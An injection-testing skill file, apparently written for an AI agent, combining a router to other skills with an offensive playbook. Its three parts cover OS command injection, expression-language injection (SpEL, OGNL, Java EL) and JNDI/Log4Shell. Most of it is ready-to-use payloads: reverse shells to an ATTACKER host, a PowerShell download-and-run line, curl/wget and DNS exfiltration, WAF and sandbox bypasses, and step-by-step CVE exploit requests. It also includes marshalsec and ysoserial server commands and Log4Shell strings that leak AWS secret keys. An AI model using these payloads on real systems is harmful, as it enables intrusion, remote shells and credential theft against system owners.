---
name: injection-checking
description: >-
  Entry P1 category router + expert playbook for injection testing. Covers command injection (OS shell metacharacters, blind/OOB, filter bypass, WAF bypass, reverse shells, PHP disable_functions bypass, component-level sinks), expression language injection (SpEL, OGNL, Java EL, Struts2/Confluence CVEs, sandbox bypass), JNDI injection (RMI/LDAP class loading, Log4Shell CVE-2021-44228, JDK version constraints, post-8u191 bypass via deserialization gadgets, marshalsec tooling). Also routes to XSS, SQLi, SSRF, XXE, SSTI, NoSQL, Deserialization, CRLF, Request Smuggling, Prototype Pollution, Type Juggling, HPP, XSLT, CSV Formula Injection based on how attacker-controlled input is consumed.
---

# Injection Testing — Router & Expert Playbook

路由入口 + 深度注入攻击手册。当输入进入危险解释器或执行环境时，先路由再深入。

## Router: When to Use

- 输入会进入 HTML、JS、SQL、模板、URL 提取器、XML 解析器或 shell
- 你还没决定应该先走 XSS、SQLi、SSRF、XXE、SSTI、CMDi 还是 NoSQL
- 你需要按输入流向选择正确的深度专题 skill

## Skill Map

- [XSS Cross Site Scripting](../hunt-xss/SKILL.md)
- [SQLi SQL Injection](../hunt-sqli/SKILL.md)
- [SSRF Server Side Request Forgery](../hunt-ssrf/SKILL.md)
- [XXE XML External Entity](../hunt-xxe/SKILL.md)
- [SSTI Server Side Template Injection](../hunt-ssti/SKILL.md)
- [NoSQL Injection](../nosql-injection/SKILL.md)
- [Deserialization Insecure](../hunt-deserialization/SKILL.md)
- [CRLF Injection](../crlf-injection/SKILL.md)
- [Extra Injection Types (SSI, LDAP, XPath)](./EXTRA_INJECTION_TYPES.md)
- [Request Smuggling](../hunt-http-smuggling/SKILL.md)
- [Prototype Pollution](../hunt-prototype-pollution/SKILL.md)
- [Type Juggling](../type-juggling/SKILL.md)
- [HTTP Parameter Pollution](../http-parameter-pollution/SKILL.md)
- [XSLT Injection](../xslt-injection/SKILL.md)
- [CSV Formula Injection](../csv-formula-injection/SKILL.md)
- [File Access Vuln](../file-access-vuln/SKILL.md)

## Recommended Flow

1. 先识别输入最终落点
2. 再选与该解释器最匹配的专题 skill
3. 以下为本 skill 内置的三大注入深度手册：Command Injection、Expression Language Injection、JNDI Injection

---
# PART 1: OS COMMAND INJECTION

> Expert command injection techniques. Covers all shell metacharacters, blind injection, time-based detection, OOB exfiltration, polyglot payloads, and real-world code patterns.

## 1. SHELL METACHARACTERS (INJECTION OPERATORS)

| Metacharacter | Behavior | Example |
|---|---|---|
| `;` | Runs second command regardless | `dir; whoami` |
| `\|` | Pipes stdout to second command | `dir \| whoami` |
| `\|\|` | Run second only if first FAILS | `dir \|\| whoami` |
| `&` | Run second in background (or sequenced in Windows) | `dir & whoami` |
| `&&` | Run second only if first SUCCEEDS | `dir && whoami` |
| `$(cmd)` | Command substitution | `echo $(whoami)` |
| `` `cmd` `` | Command substitution (backtick) | `` echo `whoami` `` |
| `>` | Redirect stdout to file | `cmd > /tmp/out` |
| `>>` | Append to file | `cmd >> /tmp/out` |
| `<` | Read file as stdin | `cmd < /etc/passwd` |
| `%0a` | Newline character (URL-encoded) | `cmd%0awhoami` |
| `%0d%0a` | CRLF | Multi-command injection |

### First-pass payload families

| Context | Start With | Backup |
|---|---|---|
| generic shell separator | `;id` | `&&id` |
| quoted argument | `";id;"` | `';id;'` |
| blind timing | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| command substitution | `$(id)` | `` `id` `` |
| out-of-band DNS | `;nslookup token.collab` | Windows `nslookup` variant |

```text
cat$IFS/etc/passwd
{cat,/etc/passwd}
%0aid
```

## 2. COMMON VULNERABLE CODE PATTERNS

### PHP
```php
$dir = $_GET['dir'];
$out = shell_exec("du -h /var/www/html/" . $dir);
exec("ping -c 1 " . $ip);          // $ip = "127.0.0.1 && cat /etc/passwd"
system("convert " . $file);        // ImageMagick RCE
passthru("nslookup " . $host);     // $host = "x.com; id"
```

### Python
```python
os.system("curl " + url)            # url = "x.com; id"
subprocess.call("ls " + path, shell=True)  # shell=True is the key vulnerability
os.popen("ping " + host)
```

### Node.js
```javascript
const { exec } = require('child_process');
exec('ping ' + req.query.host, ...);  // host = "x.com; id"
```

### ASP (Classic)
```vb
szCMD = "type C:\logs\" & Request.Form("FileName")
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run szCMD
```

## 3. BLIND COMMAND INJECTION — DETECTION

### Time-Based
```bash
# Linux: ; sleep 5 | sleep 5 | $(sleep 5) | `sleep 5` | & sleep 5 &
# Windows: & timeout /T 5 /NOBREAK | & ping -n 5 127.0.0.1
```

### OOB via DNS
```bash
; nslookup BURP_COLLAB_HOST
; host `whoami`.BURP_COLLAB_HOST
$(nslookup $(whoami).BURP_COLLAB_HOST)
& nslookup %USERNAME%.BURP_COLLAB_HOST
```

### OOB via HTTP
```bash
; curl http://BURP_COLLAB_HOST/`whoami`
; wget http://BURP_COLLAB_HOST/$(id|base64)
& powershell -c "Invoke-WebRequest http://BURP_COLLAB_HOST/$(whoami)"
```

### Blind Injection Decision Tree
```
Found potential injection point?
├── Try basic: ; sleep 5 → Response delays? → Confirmed blind injection
├── No delay? → Try: | sleep 5 → $(sleep 5) → \`sleep 5\`
├── Try URL encoding: %3B%20sleep%205 → double encoding: %253B%2520sleep%25205
└── All blocked → encoding bypass / whitespace bypass / $IFS / glob
```

## 4. PAYLOAD LIBRARY

### Information Gathering
```bash
; id ; whoami ; uname -a ; cat /etc/passwd ; env ; printenv
; cat /proc/1/environ ; ifconfig ; cat /etc/hosts
```

### Reverse Shells (Linux)
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
; nc ATTACKER 4444 -e /bin/bash
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
```

### Reverse Shells (Windows PowerShell)
```powershell
& powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
```

## 5. FILTER BYPASS TECHNIQUES

### Space Alternatives
```bash
cat</etc/passwd          # < instead of space
{cat,/etc/passwd}        # brace expansion
cat$IFS/etc/passwd       # $IFS variable
```

### Keyword Bypass
```bash
a=c;b=at;c=/etc/passwd; $a$b $c   # variable assembly
c=at;ca$c /etc/passwd
/???/??t /???/p??s??             # wildcard ( /bin/cat /etc/passwd )
```

### cat Alternatives
```bash
tac /etc/passwd ; nl /etc/passwd ; head /etc/passwd ; tail /etc/passwd
more /etc/passwd ; less /etc/passwd ; sort /etc/passwd ; rev /etc/passwd | rev
xxd /etc/passwd ; strings /etc/passwd ; base64 /etc/passwd
```

### WAF Bypass Techniques
```bash
# Comment insertion (PHP specific)
sys/*x*/tem('id')

# Base64/ROT13 encoding (PHP)
base64_decode('c3lzdGVt')('id')
str_rot13('flfgrz')('id')

# chr() assembly
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
```

## 6. PHP disable_functions BYPASS

1. **LD_PRELOAD + mail()**: Upload .so, `putenv("LD_PRELOAD=/tmp/evil.so")`, `mail()` triggers sendmail → .so constructor runs.
2. **Shellshock (CVE-2014-6271)**: `putenv("PHP_LOL=() { :; }; /usr/bin/id > /tmp/out")`, `mail()`.
3. **Apache mod_cgi + .htaccess**: Write CGI handler, execute .sh scripts.
4. **PHP-FPM / FastCGI**: Socket accessible at `/var/run/php-fpm.sock` or port 9000.
5. **COM Object (Windows)**: `new COM('WScript.Shell')`.
6. **ImageMagick Delegate (CVE-2016-3714)**: SVG/MVG with embedded command in URL.
7. **iconv (CVE-2024-2961)** via `php://filter/convert.iconv`; **FFI** (`FFI::cdef` + `libc`).

## 7. COMPONENT-LEVEL COMMAND INJECTION

- **ImageMagick**: MVG format with shell command in URL; filename `|id` → convert.
- **FFmpeg**: HLS/concat protocol, m3u8 playlist → SSRF/LFI.
- **Elasticsearch Groovy Script (pre-5.x)**: `Runtime.getRuntime().exec('id')` via script_fields.
- **Ping/Traceroute/NSLookup Diagnostic Pages**: `127.0.0.1; id` / `127.0.0.1 && cat /etc/passwd`.
- **PDF generators**: wkhtmltopdf / WeasyPrint with user HTML.
- **Git wrappers**: `git clone` URL / hooks.

## 8. COMMON INJECTION ENTRY POINTS

| Entry | Example |
|---|---|
| Network tools | ping, nslookup, traceroute, whois forms |
| File conversion | image resize, PDF generate, format convert |
| Email senders | From address, name fields in notification emails |
| Search/sort parameters | Passed to grep, find, sort commands |
| Log viewing | Passed to tail, grep commands |
| Backup/restore features | File path parameters |
| Archive processing | zip/unzip, tar with user-provided filename |

---
# PART 2: EXPRESSION LANGUAGE INJECTION

> Expert EL injection techniques covering SpEL (Spring), OGNL (Struts2), and Java EL (JSP/JSF). Distinct from SSTI — EL injection targets expression evaluators in Java frameworks, not template engines.

**Key distinction**: SSTI targets template rendering engines; EL injection targets expression evaluators embedded in Java frameworks. They share detection probes (`${7*7}`) but diverge in exploitation.

### Related Routing
- [ssti-server-side-template-injection](../hunt-ssti/SKILL.md) for template engines
- JNDI section below when EL evaluation leads to JNDI lookup

## 2.1 DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

## 2.2 SpEL (SPRING EXPRESSION LANGUAGE)

**Where SpEL appears**: `@Value` annotations, Spring Security expressions, Spring Cloud Gateway routes, Thymeleaf preprocessing, Spring Data `@Query`.

### RCE via Runtime
```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE with Output Capture (Commons IO)
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE with Output Capture (Spring StreamUtils)
```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### Spring Cloud Gateway — CVE-2022-22947
```bash
# Step 1: Add route with SpEL in filter
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"}}],"uri":"http://example.com","predicates":[{"name":"Path","args":{"_genkey_0":"/hackpath"}}]}

# Step 2: POST /actuator/gateway/refresh
# Step 3: GET /hackpath → Response header "Result" contains command output
# Step 4: DELETE /actuator/gateway/routes/hacktest ; POST /actuator/gateway/refresh
```

### SpEL Sandbox Bypass (SimpleEvaluationContext)
```java
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

## 2.3 OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)

**Where OGNL appears**: Apache Struts2, Confluence Server, any Java app using `ognl.Ognl.getValue()`.

### Basic RCE
```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 Sandbox Bypass — _memberAccess
```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Struts2 OgnlUtil Blacklist Clear
```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

### Confluence OGNL — CVE-2021-26084
```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded
queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL-decoded: \u0027+{3*3}+\u0027
# If response contains 9 → confirmed → escalate to Runtime.exec for RCE
```

## 2.4 JAVA EL (JSP / JSF)

**Where Java EL appears**: JSP pages, JSF (JavaServer Faces), custom tag libraries.

```java
${Runtime.getRuntime().exec("id")}
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

## 2.5 DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Struts2? → Try %{...} OGNL payloads → Check Content-Type injection (S2-045)
├── Spring? → Try T(java.lang.Runtime) SpEL → Check /actuator/gateway
├── Confluence? → Try OGNL via action parameters
├── JSP/JSF? → Try Java EL payloads
├── Error messages: "ognl.OgnlException" → OGNL / "SpelEvaluationException" → SpEL
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec (ProcessBuilder, ScriptEngine)
```

## 2.6 QUICK REFERENCE

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}
# OGNL RCE: %{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
# OGNL sandbox bypass: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(...)}
# Java EL RCE: ${"".getClass().forName("java.lang.Runtime")...}
# Confluence probe: queryString=\u0027%2b{3*3}%2b\u0027
# Spring Cloud Gateway: POST /actuator/gateway/routes/x → SpEL in filter args
```

---
# PART 3: JNDI INJECTION

> Expert JNDI injection techniques covering lookup mechanism abuse, RMI/LDAP class loading, JDK version constraints, Log4Shell (CVE-2021-44228), marshalsec tooling, and post-8u191 bypass via deserialization gadgets.

### Related Routing
- [deserialization-insecure](../hunt-deserialization/SKILL.md) when JNDI leads to deserialization (post-8u191)
- EL section above when the JNDI sink is reached via SpEL or OGNL

## 3.1 CORE MECHANISM

JNDI provides a unified API for looking up objects from naming/directory services. **Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.

```java
String name = request.getParameter("resource");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);  // name = "ldap://attacker.com/Exploit"
```

## 3.2 ATTACK VECTORS

| Protocol | URL Pattern | Notes |
|---|---|---|
| RMI | `rmi://attacker.com:1099/Exploit` | Blocked by `trustURLCodebase=false` since 8u121 |
| LDAP | `ldap://attacker.com:1389/cn=Exploit` | Preferred — LDAP restrictions added later (8u191) |
| DNS | `dns://attacker-dns-server/lookup-name` | Detection only — no RCE, confirms injection |

## 3.3 JDK VERSION CONSTRAINTS AND BYPASS

| JDK Version | RMI Remote Class | LDAP Remote Class | Bypass |
|---|---|---|---|
| < 8u121 | YES | YES | Direct class loading |
| 8u121 – 8u190 | NO | YES | Use LDAP vector |
| >= 8u191 | NO | NO | Return serialized gadget via LDAP |
| >= 8u191 (alt) | NO | NO | `BeanFactory` + EL injection |

### Post-8u191 Bypass: LDAP → Serialized Gadget
Instead of returning a remote class URL, the LDAP server returns a **serialized Java object** in `javaSerializedData`. If a gadget chain (CommonsCollections) is on the classpath, RCE is achieved.

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# JNDI lookup → rmi://attacker:1099/whatever
```

### Post-8u191 Bypass: BeanFactory + EL (Tomcat)
```
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

## 3.4 TOOLING

```bash
# marshalsec — LDAP reference server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# marshalsec — RMI reference server  
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# JNDI-Injection-Exploit (all-in-one)
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip

# Rogue JNDI
java -jar RogueJndi.jar --command "id" --hostname attacker.com
```

## 3.5 LOG4J2 — CVE-2021-44228 (LOG4SHELL)

Log4j2 supports **Lookups** — expressions like `${...}` evaluated in log messages. The `jndi` lookup triggers `InitialContext.lookup()`:

```
${jndi:ldap://attacker.com/x}
```

**Any logged string** with this pattern triggers it — User-Agent, form fields, HTTP headers, URL paths, error messages.

### Detection Payloads
```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}
# Exfiltrate env info via DNS:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF Bypass Variants
```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

### Split-Log Bypass (Advanced)
```text
# Request 1: X-Custom: ${jndi:ldap://attacker.com/
# Request 2: X-Custom: exploit}
# If app concatenates log entries → combined triggers
```

### Injection Points to Test
```text
User-Agent, X-Forwarded-For, Referer, Accept-Language, X-Api-Version, Authorization,
Cookie values, URL path segments, POST body fields, Search queries, File upload names,
Form field names, GraphQL variables, SOAP/XML elements, JSON values
```

### Affected Versions
- Log4j2 2.0-beta9 through 2.14.1
- Fixed in 2.15.0 (partial), fully fixed in 2.17.0
- Log4j 1.x NOT affected

## 3.6 OTHER JNDI SINKS (BEYOND LOG4J)

| Product / Framework | Sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API, VelocityResponseWriter |
| Apache Druid | Various config endpoints |
| VMware vCenter | Multiple endpoints |
| H2 Database Console | JNDI connection string |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

## 3.7 TESTING METHODOLOGY

```
Suspected JNDI injection point?
├── Send DNS-only probe: ${jndi:dns://TOKEN.collab.net} → DNS hit? Confirmed
├── Determine JDK version: ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
├── JDK < 8u191? → marshalsec LDAP server → direct RCE
├── JDK >= 8u191? → LDAP → serialized gadget (need gadget on classpath)
│   ├── BeanFactory + EL (need Tomcat)
│   └── JRMPListener via ysoserial
└── WAF blocking ${jndi:...}? → obfuscation: ${${lower:j}ndi:...}
```

## 3.8 QUICK REFERENCE

```text
# Safe confirmation (DNS only): ${jndi:dns://TOKEN.collab.net}
# LDAP RCE (JDK < 8u191): ${jndi:ldap://ATTACKER:1389/Exploit}
# Version exfiltration: ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
# Log4Shell with WAF bypass: ${${lower:j}ndi:${lower:l}dap://ATTACKER/x}
# Start LDAP reference server: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389
# Post-8u191 — ysoserial JRMP: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```
